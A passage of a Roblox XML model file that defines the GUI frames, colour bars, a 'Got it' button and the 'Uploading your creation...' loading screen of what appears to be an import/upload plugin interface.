										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">4</token>
										<string name="Name">Tip</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>7</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Use the ID above to import your creation using the plugin.</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX80A7F3BE924D49C8A3C483D9D7274994">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">180</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX95B16D2A73FD43DD97B2DD5FB6ACFF7E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294946560</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Yellow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX4D9B85876AB44E09A867E556AD1EF0E6">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283144011</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Green</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXD11EA94554FF46B1BBE6FE963AEEE61D">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278497260</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Blue</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.400000006</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX12938B4071044450A0B2C37DCA11F77B">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294901760</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Red</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.600000024</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX17C349E9A14D4EC5B46E5210DF1B4B01">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4285215356</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Purple</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.800000012</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX4F8F2AAFDF3A42C4B4E4E3360CB49DDD">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Close</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>1</YS>
										<YO>5</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextButton" referent="RBX09E1B43337C745719B9A756E80F7397C">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.5</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<bool name="Modal">false</bool>
										<string name="Name">Button</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">Got it</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.800000012</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX80533E2EE23440719A35337066E5D4BB">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.300000012</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXFEB625548C5D4DF5A2880F51357C93DB">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">true</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Loading</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>80</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX27DC773E92D04072AF88E0B814EB66A2">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXFE9400B1295E4AC9BBCE292D3C81E6E0">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294946560</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Yellow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXCEBA7E0655EB401EB18B245FADBFFEC6">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283144011</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Green</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX0EEC21C1AF3740098A7A654AC2B6B5BD">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278497260</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Blue</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.400000006</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX4F34BECAD32143F2A1D53F894B959480">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294901760</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Red</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.600000024</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXCA9673018F01418192AA0F568E23A89E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4285215356</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Purple</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.800000012</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="TextLabel" referent="RBX4BF12BE45EF4480A9E2AB519A01F6A47">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">6</token>
										<string name="Name">TextLabel</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>50</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Uploading your creation...</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">18</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.800000012</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXD351ACAEE5CD41098B08129ED0E18A7F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">BottomColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">180</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX04B410C157AB498B92F761A2FB2A10B0">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294946560</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Yellow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX00903C5003BE4B6FA0D2D13DE2B8D3BD">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283144011</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Green</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX0312DE1381C148CCA59746FAEB54EE31">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278497260</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Blue</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.400000006</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXAE32FF40A4B342E9996C89B6F59B0501">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294901760</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Red</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.600000024</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX6668E886BA35400AAE898EF69AD56936">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4285215356</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Purple</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
